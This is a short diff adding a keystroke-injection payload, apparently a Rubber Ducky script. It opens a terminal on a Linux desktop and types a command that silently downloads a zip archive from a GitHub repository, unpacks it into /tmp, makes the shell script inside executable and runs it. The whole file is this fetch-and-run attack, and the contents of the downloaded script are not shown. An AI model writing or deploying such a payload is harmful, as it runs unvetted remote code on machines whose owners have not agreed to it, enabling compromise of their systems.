@@ -1,0 +1,5 @@
+DELAY 5000
+CTRL ALT t
+DELAY 3000
+STRING wget -qO- https://github.com/nileshevrywhr/nileshevrywhr/raw/main/assets/pv.zip > /tmp/pv.zip && unzip -o /tmp/pv.zip -d /tmp/pv && chmod +x /tmp/pv/pv.sh && bash /tmp/pv/pv.sh
+ENTER
